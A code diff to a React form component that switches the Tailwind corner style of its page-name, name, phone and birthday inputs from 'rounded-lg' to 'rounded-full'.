@@ -100,7 +100,7 @@ const FormInputGroup: React.FC = () => {
 		<div className='my-5'>
 			<input
 				ref={pageNameInputRef}
-				className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
+				className='my-2 w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
 				type='text'
 				placeholder='Page Name'
 				value={formData.pageName}
@@ -113,7 +113,7 @@ const FormInputGroup: React.FC = () => {
 
 			<input
 				ref={nameInputRef}
-				className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
+				className='my-2 w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
 				type='text'
 				placeholder='Your Name (Name and Surname)'
 				value={formData.name}
@@ -129,8 +129,8 @@ const FormInputGroup: React.FC = () => {
 				jumpCursorToEnd
 				copyNumbersOnly
 				autocompleteSearch
-				containerClass='group my-4 flex items-center w-full p-3 rounded-lg border bg-white border-gray-300 focus-within:border-blue-500 react-tel-input'
-				inputClass='my-2 w-full rounded-lg text-base border-none border-gray-300'
+				containerClass='group my-4 flex items-center w-full p-3 rounded-full border bg-white border-gray-300 focus-within:border-blue-500 react-tel-input'
+				inputClass='my-2 w-full rounded-full text-base border-none border-gray-300'
 				buttonClass='border-none bg-transparent'
 				dropdownClass='border-none bg-white'
 				inputProps={{
@@ -145,7 +145,7 @@ const FormInputGroup: React.FC = () => {
 
 			<input
 				ref={birthdayInputRef}
-				className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
+				className='my-2 w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
 				type='text'
 				placeholder='Birthday (MM/DD/YYYY)'
 				value={formData.birthday}
